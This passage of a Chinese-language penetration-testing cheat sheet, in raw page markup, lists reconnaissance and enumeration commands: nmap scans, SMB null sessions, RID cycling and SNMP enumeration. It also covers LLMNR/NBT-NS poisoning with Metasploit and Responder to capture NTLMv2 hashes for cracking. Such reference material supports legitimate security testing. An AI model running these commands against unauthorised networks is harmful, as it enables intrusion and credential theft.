style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>git clone https://github.com/killswitch-GUI/SimplyEmail.git
</span></span><span style=display:flex><span>./SimplyEmail.py -all -e TARGET-DOMAIN
</span></span></code></pre></td></tr></table></div></div><h3 id=半主动信息收集>半主动信息收集<a hidden class=anchor aria-hidden=true href=#半主动信息收集>#</a></h3><h4 id=基本指纹识别>基本指纹识别<a hidden class=anchor aria-hidden=true href=#基本指纹识别>#</a></h4><p>手动指纹识别/banner抓取</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nc -v 192.168.1.1 25</code> <code>telnet 192.168.1.1 25</code></td><td>通过显示banner识别版本和指纹</td></tr></tbody></table><h4 id=使用nc抓取banner>使用NC抓取banner<a hidden class=anchor aria-hidden=true href=#使用nc抓取banner>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nc TARGET-IP 80
</span></span><span style=display:flex><span>GET / HTTP/1.1
</span></span><span style=display:flex><span>Host: TARGET-IP
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0
</span></span><span style=display:flex><span>Referrer: meh-domain
</span></span><span style=display:flex><span>&lt;enter&gt;
</span></span></code></pre></td></tr></table></div></div><h3 id=主动信息收集>主动信息收集<a hidden class=anchor aria-hidden=true href=#主动信息收集>#</a></h3><h4 id=dns-爆破>DNS 爆破<a hidden class=anchor aria-hidden=true href=#dns-爆破>#</a></h4><h5 id=dnsrecon>DNSRecon<a hidden class=anchor aria-hidden=true href=#dnsrecon>#</a></h5><table><thead><tr><th>DNS Enumeration Kali - DNSRecon</th></tr></thead><tbody><tr><td>root :~# dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std &ndash;xml ouput.xml</td></tr></tbody></table><h4 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h4><h5 id=nmap命令>Nmap命令<a hidden class=anchor aria-hidden=true href=#nmap命令>#</a></h5><p>更多命令，详见 <a href=https://highon.coffee/blog/nmap-cheat-sheet/>Nmap备忘录</a> 。</p><p>基本Nmap 命令：</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nmap -v -sS -A -T4 target</code></td><td>详细显示，syn探测，高速扫描，系统和服务版本信息，脚本扫描和路由跟踪</td></tr><tr><td><code>nmap -v -sS -p--A -T4 target</code></td><td>同上，且扫描所有TCP端口，耗时更长</td></tr><tr><td><code>nmap -v -sU -sS -p- -A -T4 target</code></td><td>同上，且扫描所有UDP端口，耗时巨长</td></tr><tr><td><code>nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.1.X</code></td><td>扫描可能包含漏洞的SMB服务</td></tr><tr><td>` ls /usr/share/nmap/scripts/*</td><td>grep ftp `</td></tr></tbody></table><p>别在外网采用<code>T4</code> 扫描，使用<code>TCP</code> 连接扫描时用<code>T2</code> 比较合适。<code>T4</code> 扫描用在低延迟高带宽的内部网络测试会更合适。但这也取决于目标设备，如果用<code>T4/T5</code> 扫他们，结果就可能不准确。总的来说，扫描越慢越好，也可以先快速扫描1000个目标方便上手测试，然后再慢慢扫其余的。</p><h6 id=nmap-udp扫描>Nmap UDP扫描<a hidden class=anchor aria-hidden=true href=#nmap-udp扫描>#</a></h6><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nmap -sU TARGET 
</span></span></code></pre></td></tr></table></div></div><h6 id=udp-协议扫描器>UDP 协议扫描器<a hidden class=anchor aria-hidden=true href=#udp-协议扫描器>#</a></h6><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>git clone https://github.com/portcullislabs/udp-proto-scanner.git
</span></span></code></pre></td></tr></table></div></div><p>扫描文件中IP地址的所有服务</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>./udp-protocol-scanner.pl -f ip.txt 
</span></span></code></pre></td></tr></table></div></div><p>扫描特定UDP服务</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>udp-proto-scanner.pl -p ntp -f ips.txt
</span></span></code></pre></td></tr></table></div></div><h6 id=其他主机发现>其他主机发现<a hidden class=anchor aria-hidden=true href=#其他主机发现>#</a></h6><p>不使用nmap发现主机的方法：</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>netdiscover -r 192.168.1.0/24</code></td><td>利用子网的地址解析协议发现同网段的IP，MAC地址和MAC厂商</td></tr></tbody></table><h2 id=枚举和攻击网络服务>枚举和攻击网络服务<a hidden class=anchor aria-hidden=true href=#枚举和攻击网络服务>#</a></h2><p>用于识别/枚举网络服务的工具。</p><h3 id=samb--smb--windows-域枚举>SAMB / SMB / Windows 域枚举<a hidden class=anchor aria-hidden=true href=#samb--smb--windows-域枚举>#</a></h3><h4 id=samba枚举>Samba枚举<a hidden class=anchor aria-hidden=true href=#samba枚举>#</a></h4><h5 id=smb枚举工具>SMB枚举工具<a hidden class=anchor aria-hidden=true href=#smb枚举工具>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nmblookup -A target
</span></span><span style=display:flex><span>smbclient //MOUNT/share -I target -N
</span></span><span style=display:flex><span>rpcclient -U &#34;&#34; target
</span></span><span style=display:flex><span>enum4linux target
</span></span></code></pre></td></tr></table></div></div><p>当然也可参考本站的 <a href=https://highon.coffee/blog/nbtscan-cheat-sheet/>nbtscan 的速查表</a></p><h5 id=smb-版本指纹识别>SMB 版本指纹识别<a hidden class=anchor aria-hidden=true href=#smb-版本指纹识别>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>smbclient -L //192.168.1.100 
</span></span></code></pre></td></tr></table></div></div><h5 id=寻找开放的smb共享>寻找开放的SMB共享<a hidden class=anchor aria-hidden=true href=#寻找开放的smb共享>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24   
</span></span></code></pre></td></tr></table></div></div><h5 id=枚举smb用户>枚举SMB用户<a hidden class=anchor aria-hidden=true href=#枚举smb用户>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-15-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-15-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-16-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-16-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>python /usr/share/doc/python-impacket-doc/examples/samrdump.py 192.168.XXX.XXX
</span></span></code></pre></td></tr></table></div></div><p>RID循环（RID Cycling ）</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-17-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-17-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>ridenum.py 192.168.XXX.XXX 500 50000 dict.txt
</span></span></code></pre></td></tr></table></div></div><p>Metasploit的RID循环攻击模块</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-18-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-18-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>use auxiliary/scanner/smb/smb_lookupsid
</span></span></code></pre></td></tr></table></div></div><h6 id=手动测试空会话>手动测试空会话<a hidden class=anchor aria-hidden=true href=#手动测试空会话>#</a></h6><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-19-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-19-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>Windows:
</span></span><span style=display:flex><span>net use \\TARGET\IPC$ &#34;&#34; /u:&#34;&#34;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Linux:
</span></span><span style=display:flex><span>smbclient -L //192.168.99.131
</span></span></code></pre></td></tr></table></div></div><h6 id=nbtscan-unixwiz>NBTScan unixwiz<a hidden class=anchor aria-hidden=true href=#nbtscan-unixwiz>#</a></h6><p>在Kali上安装使用：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-20-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-20-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>apt-get install nbtscan-unixwiz 
</span></span><span style=display:flex><span>nbtscan-unixwiz -f 192.168.0.1-254 &gt; nbtscan
</span></span></code></pre></td></tr></table></div></div><h4 id=llmnr--nbt-ns欺骗>LLMNR / NBT-NS欺骗<a hidden class=anchor aria-hidden=true href=#llmnr--nbt-ns欺骗>#</a></h4><p>从网络中窃取凭证</p><h5 id=使用metasploit进行-llmnr--netbios请求>使用Metasploit进行 LLMNR / NetBIOS请求<a hidden class=anchor aria-hidden=true href=#使用metasploit进行-llmnr--netbios请求>#</a></h5><p>欺骗/毒化 LLMNR / NetBIOS请求：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-21-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-21-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>auxiliary/spoof/llmnr/llmnr_response
</span></span><span style=display:flex><span>auxiliary/spoof/nbns/nbns_response
</span></span></code></pre></td></tr></table></div></div><p>抓取哈希</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-22-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-22-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>auxiliary/server/capture/smb
</span></span><span style=display:flex><span>auxiliary/server/capture/http_ntlm
</span></span></code></pre></td></tr></table></div></div><p>最后会得到NTLMv2 哈希，可以使用john或者hashcat破解。</p><h5 id=responderpy>Responder.py<a hidden class=anchor aria-hidden=true href=#responderpy>#</a></h5><p>你也可以选择使用 responder</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-23-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-23-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>git clone https://github.com/SpiderLabs/Responder.git
</span></span><span style=display:flex><span>python Responder.py -i local-ip -I eth0
</span></span></code></pre></td></tr></table></div></div><p>注：整个渗透测试过程可以一直允许Responder.py</p><h4 id=snmp枚举工具>SNMP枚举工具<a hidden class=anchor aria-hidden=true href=#snmp枚举工具>#</a></h4><p>SNMP枚举工具有很多。</p><p>美化SNMP输出结果使易于阅读。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-24-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-24-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>apt-get install snmp-mibs-downloader download-mibs
</span></span><span style=display:flex><span>echo &#34;&#34; &gt; /etc/snmp/snmp.conf
</span></span></code></pre></td></tr></table></div></div><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>snmpcheck -t 192.168.1.X -c public</code>` snmpwalk -c public -v1 192.168.1.X 1</td><td>grep hrSWRunName</td></tr></tbody></table><h5 id=snmpv3枚举工具>SNMPv3枚举工具<a hidden class=anchor aria-hidden=true href=#snmpv3枚举工具>#</a></h5><p>使用nmap识别SNMPv3服务器</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-25-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-25-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
</span></span></code></pre></td></tr></table></div></div><p>Rory McCune 的脚本可以帮助自动化枚举SNMPv3的用户名枚举。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-26-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-26-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>apt-get install snmp snmp-mibs-downloader
</span></span><span style=display:flex><span>wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
</span></span></code></pre></td></tr></table></div></div><p>注意：下面的路径是Kali上Metasploit的SNMP v1和v2的攻击字典，更新的字典可以参考Daniel Miessler <a href=https://github.com/danielmiessler/SecLists>在GitHub上的安全列表</a> 。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-27-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-27-1>1</a>
